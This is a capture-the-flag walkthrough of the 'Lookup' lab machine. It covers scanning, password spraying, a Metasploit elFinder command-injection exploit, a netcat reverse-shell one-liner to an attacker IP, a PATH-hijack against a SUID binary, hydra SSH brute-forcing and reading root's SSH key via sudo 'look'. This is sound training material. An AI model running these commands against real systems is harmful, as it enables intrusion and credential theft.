- - - 
created : 19-07-2025 

Tags : #easy 
- - - 
# Objective

**Lookup** offers a treasure trove of learning opportunities for aspiring hackers. This intriguing machine showcases various real-world vulnerabilities, ranging from web application weaknesses to [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) techniques. By exploring and exploiting these vulnerabilities, hackers can sharpen their skills and gain invaluable experience in ethical [Hacking](../../3%20-%20Tags/Hacking%20Concepts/Hacking.md). Through "Lookup," hackers can master the art of reconnaissance, scanning, and enumeration to uncover hidden services and subdomains. They will learn how to [Exploit](../../3%20-%20Tags/Hacking%20Concepts/Exploit.md) web application vulnerabilities, such as command injection, and understand the significance of secure coding practices. The machine also challenges hackers to automate tasks, demonstrating the power of scripting in penetration testing.

# Recon

## Rustscan/Nmap

We use [Rustscan](../../3%20-%20Tags/Hacking%20Tools/Rustscan.md) that will pass the result to [Nmap](../../3%20-%20Tags/Hacking%20Tools/Nmap.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Lookup]
└─$ rustscan -a 10.10.181.47 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: http://discord.skerritt.blog         :
: https://github.com/RustScan/RustScan :
 --------------------------------------
TreadStone was here 🚀

[~] The config file is expected to be at "/home/mdn0x/.rustscan.toml"
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
[!] Your file limit is very small, which negatively impacts RustScan's speed. Use the Docker image, or up the Ulimit with '--ulimit 5000'. 
Open 10.10.181.47:22
Open 10.10.181.47:80

- Nmap
Scanned at 2025-07-19 14:26:34 CEST for 25s

PORT   STATE SERVICE REASON         VERSION
22/tcp open  ssh     syn-ack ttl 63 OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.41 ((Ubuntu))

```

So we have [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) and a [Website](../../3%20-%20Tags/Hacking%20Concepts/Website.md) on HTTP port.
# Enumeration

## HTTP (80)

We know that we are redirected to lookup.thm so let's add the [IP address](../../3%20-%20Tags/Hacking%20Concepts/IP%20address.md) to our /etc/hosts file :

```
10.10.181.47   lookup.thm  
```

Now we can visit the [Webpage](../../3%20-%20Tags/Hacking%20Concepts/Webpage.md) :

![Pasted image 20250719143410.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719143410.png)

So we need some credentials, if we insert admin we are told the user exists so there's some login misconfig.

### Gobuster

Let's try to find some hidden directory with [Gobuster](../../3%20-%20Tags/Hacking%20Tools/Gobuster.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~/THM/CHALLENGES/Easy/Lookup]
└─$ gobuster dir -w /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt -u http://lookup.thm 

===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://lookup.thm
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.hta                 (Status: 403) [Size: 275]
/.htaccess            (Status: 403) [Size: 275]
/.htpasswd            (Status: 403) [Size: 275]
/index.php            (Status: 200) [Size: 719]
/server-status        (Status: 403) [Size: 275]
Progress: 4746 / 4747 (99.98%)
===============================================================
Finished
===============================================================


```

.* directories are forbidden but shows some info :

![Pasted image 20250719143925.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719143925.png)

### FFuf

We will use [FFuf](../../3%20-%20Tags/Hacking%20Tools/FFuf.md) for [Fuzzing](../../3%20-%20Tags/Hacking%20Concepts/Fuzzing.md) and try to find something else on subdomains :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -H 'Host: FUZZ.lookup.thm' -u http://sudo.thm -fs 218 -c

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://sudo.thm
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Header           : Host: FUZZ.lookup.thm
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 218

```

nothing more .

# Exploit

## Caido

Well we know user 'admin' exists so let's just try [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) on the password, we can Intercept the request with [Caido](../../3%20-%20Tags/Hacking%20Tools/Caido.md) and send it to automate, setting the payload on the passwd string and choosing a wordlist :

![Pasted image 20250719144942.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719144942.png)

![Pasted image 20250719145742.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719145742.png)

So this probably is the password of another user.

Let's try [Password spraying](../../3%20-%20Tags/Hacking%20Concepts/Password%20spraying.md), we switch the payload to the username :

![Pasted image 20250719150202.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719150202.png)

Boom :

![Pasted image 20250719150426.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719150426.png)

If we enter with **jose** we are redirected to /files.lookup.thm we can't see nothing so we have to add it to /etc/hosts and retry :

![Pasted image 20250719153011.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719153011.png)

And we open credentials.txt :

![Pasted image 20250719153136.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719153136.png)

Let's try login with these : nothing . neither is [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) .

Searching about the software we find it is a _web file manager_ , let's catch the version :

![Pasted image 20250719154206.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719154206.png)

## Metasploit

Let's search with [Metasploit](../../3%20-%20Tags/Hacking%20Tools/Metasploit.md) for **elFinder 2.1.47** :

```
search emsf6 > search elFinder 2.1.47

Matching Modules
================

   #  Name                                                               Disclosure Date  Rank       Check  Description
   -  ----                                                               ---------------  ----       -----  -----------
   0  exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection  2019-02-26       excellent  Yes    elFinder PHP Connector exiftran Command Injection                                                                 


Interact with a module by name or index. For example info 0, use 0 or use exploit/unix/webapp/elfinder_php_connector_exiftran_cmd_injection                                                                                   

msf6 > use 0
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp

```

Let's set the options and exploit to have a [Reverse Shell](../../3%20-%20Tags/Hacking%20Concepts/Reverse%20Shell.md) :

```
meterpreter > 
```

### Shell Stabilization

Now that we have a meterpreter connection, we can get the [Shell](../../3%20-%20Tags/Hacking%20Concepts/Shell.md) by typing the command `shell` but this shell is unstable so let's do some [Shell Stabilization](../../3%20-%20Tags/Hacking%20Concepts/Shell%20Stabilization.md) after transfered it to our machine :

- On the unstable shell `rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc 10.8.162.183 4444 >/tmp/f`
- On attacking system `nc -lvnp 4444`  [Netcat](../../3%20-%20Tags/Hacking%20Tools/Netcat.md) :

```
┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.8.162.183] from (UNKNOWN) [10.10.181.47] 60502
bash: cannot set terminal process group (811): Inappropriate ioctl for device
bash: no job control in this shell
www-data@ip-10-10-181-47:/var/www/files.lookup.thm/public_html/elFinder/php$ ls

```

Now stabilize :

```
www-data@ip-10-10-181-47:/var/www/files.lookup.thm/public_html$ python3 -c 'import pty;pty.spawn("/bin/bash")'

www-data@ip-10-10-181-47:/var/www/files.lookup.thm/public_html$ export TERM=xterm

www-data@ip-10-10-181-47:/var/www/files.lookup.thm/public_html$ ^Z

zsh: suspended  nc -lvnp 4444

┌──(mdn0x㉿mdn0xonKali)-[~]
└─$ stty raw -echo; fg
[1]  + continued  nc -lvnp 4444
                               reset

```

Once we have a stable shell let’s check what are the processes that can be run as sudo user `find / -type f -perm -u=s -ls 2>/dev/null` :

```
www-data@ip-10-10-181-47:/home/think$ find / -type f -perm -u=s -ls 2>/dev/null
      297    129 -rwsr-xr-x   1 root     root       131832 May 27  2023 /snap/snapd/19457/usr/lib/snapd/snap-confine
      847     84 -rwsr-xr-x   1 root     root        85064 Nov 29  2022 /snap/core20/1950/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root        53040 Nov 29  2022 /snap/core20/1950/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root        88464 Nov 29  2022 /snap/core20/1950/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root        55528 May 30  2023 /snap/core20/1950/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root        44784 Nov 29  2022 /snap/core20/1950/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root        68208 Nov 29  2022 /snap/core20/1950/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root        67816 May 30  2023 /snap/core20/1950/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root       166056 Apr  4  2023 /snap/core20/1950/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root        39144 May 30  2023 /snap/core20/1950/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1950/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1950/usr/lib/openssh/ssh-keysign
      847     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /snap/core20/1974/usr/bin/chfn
      853     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /snap/core20/1974/usr/bin/chsh
      922     87 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /snap/core20/1974/usr/bin/gpasswd
     1006     55 -rwsr-xr-x   1 root     root               55528 May 30  2023 /snap/core20/1974/usr/bin/mount
     1015     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /snap/core20/1974/usr/bin/newgrp
     1030     67 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /snap/core20/1974/usr/bin/passwd
     1140     67 -rwsr-xr-x   1 root     root               67816 May 30  2023 /snap/core20/1974/usr/bin/su
     1141    163 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /snap/core20/1974/usr/bin/sudo
     1199     39 -rwsr-xr-x   1 root     root               39144 May 30  2023 /snap/core20/1974/usr/bin/umount
     1288     51 -rwsr-xr--   1 root     systemd-resolve    51344 Oct 25  2022 /snap/core20/1974/usr/lib/dbus-1.0/dbus-daemon-launch-helper
     1660    463 -rwsr-xr-x   1 root     root              473576 Apr  3  2023 /snap/core20/1974/usr/lib/openssh/ssh-keysign
     3279     24 -rwsr-xr-x   1 root     root               22840 Feb 21  2022 /usr/lib/policykit-1/polkit-agent-helper-1
    14400    464 -rwsr-xr-x   1 root     root              473576 Aug  4  2023 /usr/lib/openssh/ssh-keysign
     3387     16 -rwsr-xr-x   1 root     root               14488 Jan 11  2024 /usr/lib/eject/dmcrypt-get-device
     2045     52 -rwsr-xr--   1 root     messagebus         51344 Jan 11  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
     9154     20 -rwsr-sr-x   1 root     root               17176 Jan 11  2024 /usr/sbin/pwm
      491     56 -rwsr-sr-x   1 daemon   daemon             55560 Nov 12  2018 /usr/bin/at
      672     40 -rwsr-xr-x   1 root     root               39144 Mar  7  2020 /usr/bin/fusermount
      480     88 -rwsr-xr-x   1 root     root               88464 Nov 29  2022 /usr/bin/gpasswd
      178     84 -rwsr-xr-x   1 root     root               85064 Nov 29  2022 /usr/bin/chfn
     2463    164 -rwsr-xr-x   1 root     root              166056 Apr  4  2023 /usr/bin/sudo
      184     52 -rwsr-xr-x   1 root     root               53040 Nov 29  2022 /usr/bin/chsh
      547     68 -rwsr-xr-x   1 root     root               68208 Nov 29  2022 /usr/bin/passwd
     9965     56 -rwsr-xr-x   1 root     root               55528 May 30  2023 /usr/bin/mount
    14014     68 -rwsr-xr-x   1 root     root               67816 May 30  2023 /usr/bin/su
     1235     44 -rwsr-xr-x   1 root     root               44784 Nov 29  2022 /usr/bin/newgrp
     3277     32 -rwsr-xr-x   1 root     root               31032 Feb 21  2022 /usr/bin/pkexec
     9972     40 -rwsr-xr-x   1 root     root               39144 May 30  2023 /usr/bin/umount

```

The /usr/sbin/pwm binary draws my attention, because its not there by default on Linux hosts.

Let’s see what happens when we execute it:

```
www-data@ip-10-10-181-47:/home$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: www-data
[-] File /home/www-data/.passwords not found

```

Interesting. So this binary seems to execute the “id” command, and then extracts the username out of it, and then puts that username into “/home/username/.passwords” and tries to do something with it.

If the “id” command is not specified with it’s full path (/bin/id), it is found and executed via the PATH variable in our environment :

```
www-data@ip-10-10-181-47:/home$ echo $PATH
/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

Let’s try to trick the program into executing a different “ID” command, one that would result in the “think” username to be extracted from the output.
_Path Hijack_

We can add /tmp to our path :

```
www-data@ip-10-10-181-47:/$ export PATH=tmp:$PATH
www-data@ip-10-10-181-47:/$ echo $PATH
tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
```

And now create /tmp/id with the following content :

```
# Create the `id` command under /tmp/id
cat > /tmp/id << EOF
#!/bin/bash
echo 'uid=1000(think) gid=1000(think)group=1000(think)'
EOF

# Give executable permission to /tmp/id
chmod +x /tmp/id
```

Now we run it again :

```
www-data@ip-10-10-116-56:/$ /usr/sbin/pwm
[!] Running 'id' command to extract the username and user ID (UID)
[!] ID: think
jose1006
jose1004
jose1002
jose1001teles
jose100190
jose10001
jose10.asd
jose10+
jose0_07
jose0990
jose0986$
jose098130443
jose0981
jose0924
jose0923
jose0921
thepassword
jose(1993)
jose'sbabygurl
jose&vane
jose&takie
jose&samantha
jose&pam
jose&jlo
jose&jessica
jose&jessi
josemario.AKA(think)
jose.medina.
jose.mar
jose.luis.24.oct
jose.line
jose.leonardo100
jose.leas.30
jose.ivan
jose.i22
jose.hm
jose.hater
jose.fa
jose.f
jose.dont
jose.d
jose.com}
jose.com
jose.chepe_06
jose.a91
jose.a
jose.96.
jose.9298
jose.2856171

```

And we have a password list file for 'think' .
# SSH (22)

## Hydra

Let's do some [Bruteforcing](../../3%20-%20Tags/Hacking%20Concepts/Bruteforcing.md) to find the right password :

```
hydra -l think -P passwords  10.10.116.56 ssh -vvv 
```

![Pasted image 20250719174923.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719174923.png)

## First Access

Now we can access 'think' [SSH](../../3%20-%20Tags/Hacking%20Concepts/SSH.md) and read the user flag :

```
think@ip-10-10-116-56:~$ ls
user.txt
think@ip-10-10-116-56:~$ cat user.txt 
38375fb4dd8baa2b2039ac03d92b820e
```
# Privilege Escalation

We start [Privilege Escalation](../../3%20-%20Tags/Hacking%20Concepts/Privilege%20Escalation.md) to root with sudo -l :

```
think@ip-10-10-116-56:~$ sudo -l
[sudo] password for think: 
Matching Defaults entries for think on ip-10-10-116-56:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User think may run the following commands on ip-10-10-116-56:
    (ALL) /usr/bin/look

```

## GTFObins

We can check [GTFObins](../../3%20-%20Tags/Hacking%20Tools/GTFObins.md) to see if we can exploit this somehow :

![Pasted image 20250719175202.png](../../2%20-%20Resources/Others/Flameshots/Pasted%20image%2020250719175202.png) 

Let's try it to see the root flag :
```
think@ip-10-10-116-56:/$ sudo usr/bin/look '' "/root/root.txt"
5a285a9f257e45c68bb6c9f9f57d18e8
```

We can also copy root ssh key to our Kali machine and use it to root ssh :

```
think@ip-10-10-116-56:/$ sudo usr/bin/look '' "/root/.ssh/id_rsa"
```

Remember to make it readable with chmod 600 .